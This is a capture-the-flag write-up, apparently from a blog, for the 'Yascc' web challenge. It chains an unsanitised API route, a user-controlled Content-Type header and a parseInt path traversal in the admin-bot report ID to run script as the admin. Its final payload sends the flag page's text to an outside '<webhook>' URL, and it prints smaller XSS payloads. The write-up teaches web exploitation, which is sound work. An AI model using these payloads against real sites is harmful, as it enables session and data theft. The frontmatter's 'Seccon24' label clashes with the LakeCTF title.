---
title: "Lakectf - Yascc writeup "
CTF: "Seccon24"
date: "2024-12-10"
description: "Writeup of Yascc web challenge from Lakectf 24"
read: 10
image: /images/lakectf.png
---
#### **Author:** Manaf

The Given Challenge was a Usual Admin bot based challenge where the main idea is to get xss somehow and exfiltrate something from the admin.

## Handout

- There were more 3 things given as such one app directory which had the main logic of the whole program

- admin directory which had the logic about the admin bot about what it was doing and how it was interacting with the page

- And Finally we were also just given a db.sqlite file which well as the name stand is the sqlite database which stored everything from notes and and tasks as such

## Files/Routes

I shall not be giving an elaborate explaination about what each and every file and route does but i shall be giving a surface level understanding about them or else this blog would take too long 💀

![Idk](/images/yascc/routes.png)

### Flag Condition 
Well the flag is stored as one of the posts more important it is the first post which exists but the issue is only the admin.So well what we have in mind is to either make the admin do some action from ourside or we get the admin's token after which we can log in as admin and get the flag.


### Thoughts
As it stand we need and xss some way or the other right
but how well since this is a note making application you can give your inputs as title and body and well it puts it as such

- What makes this challenge a small issue is well They are using a rather (small) and irrelevant looking library called DOMPURIFY which completely doesnt mess up any chance i have to get a xss ,and if there are any of you who didnt understand it yet well dompurify is a standard industrial level library which is rather safe at the current point,besides dompurify there also exists a strict CSP which exists making our life a bigger pain

I also looked at how they were passing things in the databse as such at first which looked like sqli might have been possible but then slowly reading the whole code it would never have been possible 

One Thing i would still like to take in consideration here is that Dompurify will only sanitize when we are trying to view the given thing via some route
from views.ts and another thing that if i was to give some form of payload like a normal `<img src=x onerror=alert()>`
this whole sentence would directly go in the database and get stored 

![Something Like this](/images/yascc/sqldb.png)

### Exploitation/quirks

Well Since we already see that dompurify is there so as to remove the tags which it finds dangerous its evident that our xss wont be directly on `/posts/:id` looking at the whole application we say that there is a `/api/posts/:id/` and well there is no parsing of sort which occurs there all it ends up doing is returning our given data in form of json

this precisely

```typescript
posts.get("/:post_id", (req, res, next) => {
    res.status(200).json(req.post!)
})
```
Also There is a very weird code which exists in the`app.ts`
```typescript
app.get(
    "*",
    handleAsync(async (req, res, next) => {
        const { error, data: query } = await assetsQuerySchema.safeParseAsync(req.query)
        if(!error){
            res.header("content-type", query.contentType)
        }

        const path = join(assetsPath, req.path)

        if(!existsSync(path))return next()

        const stat = statSync(path)
        if (!stat.isFile()) return next()

        // doesn't start with assets / path traversal
        if(relative(assetsPath, path).startsWith(".."))return next()
        
        res.sendFile(path)
    })
)
```
It is taking its own Content-Type ????,Kinda sus if you ask me

Well Now realizing this you can basically just chain the previous two things and end up executing js by doing such 
Note 1:
```javascript
alert()
```
Note 2:
```javascript
<script src="/api/posts/<id>/body?contentType=text/javascript"></script>
```
![](/images/yascc/alert.png)

Well This is it then i guess right we have alert now we should be able to give this to the bot and GG's

![](/images/yascc/meme-1.jpg)

See the way you report something to the bot is via the `/posts/:report_id/report` which basically takes the given id and send it to the bot,So At first you wouldnt really find an issue reporting so we thought we would have to end up finding another diff way to get the xss,However
looking at views.ts we realize how the Id is getting parsed exactly

```typescript
const reportIdSchema = z.custom(data => {
    const report_id = parseInt(data)
    if(isNaN(report_id))throw new APIError(400, "Invalid Report ID")
    return true
})
```
If your input is `1%2F..%2F..%2Fapi%2Fposts%2F<id>%2Ftitle`, parseInt(data) will return 1, and it won't trigger the isNaN condition.
However, your input data remains a string ("1%2F..%2F.."), and since you're not coercing it to a number, the validated result is not actually converted into a proper integer

Hence this way you can basically just `../../api/posts/<id>/:field` the place where we end up having xss to the bot directly and hence execute our js 

Well now all you need to do is read the first post which exists as this is where the flag would pre-exist as environmental variable
```typescript
create_post: {
    const { "count(*)": count }: Count = await db.get(`SELECT count(*) FROM posts`)
    if(count > 0)break create_post

    console.log(`No post in database: Creating installation successful post...`)

    const post: InsertablePost = {
        author: "system",
        title: `Installation Successful !`,
        body: `The forum installation has been successful ! Thank you for using xxxx
        
Environment Variables:
\`\`\`
${
    Object.entries(process.env)
    .map(([k, v]) => `${k}=${v}`)
    .join("\n")
}
\`\`\`

`,
        created_at: Date.now(),
    }

    const { fields, values_escape, values } = formatInsertObject(post)
    await db.run(
        `INSERT INTO posts (${fields}) VALUES (${values_escape})`,
        values
    )
}
```


### Final Payload

Post1
```javascript
// post 1
let w = window.open("/posts/1")
setTimeout(()=>{window.location = "<webhook>?flag="+encodeURI(w.document.body.innerText.slice(350))},2000)
```

Post2
```javascript
<script src="/api/posts/<id>/body?contentType=text/javascript"></script>
```
